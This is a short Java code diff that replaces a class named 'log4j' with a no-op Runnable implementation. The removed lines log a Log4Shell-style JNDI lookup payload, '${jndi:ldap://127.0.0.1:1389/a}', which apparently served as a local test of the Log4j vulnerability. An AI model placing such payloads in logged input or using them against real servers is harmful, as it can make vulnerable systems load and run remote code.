@@ -18,15 +18,18 @@
  * along with this program.  If not, see [http://www.gnu.org/licenses/]
  */
 
-package cn.taketoday.context;
+package cn.taketoday.core.task;
 
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
+/**
+ * A no-op {@link Runnable} implementation.
+ *
+ * @author Rick Evans
+ */
+public class NoOpRunnable implements Runnable {
 
-public class log4j {
-    private static final Logger logger = LogManager.getLogger(log4j.class);
+	@Override
+	public void run() {
+		// explicit no-op
+	}
 
-    public static void main(String[] args) {
-        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
-    }
 }
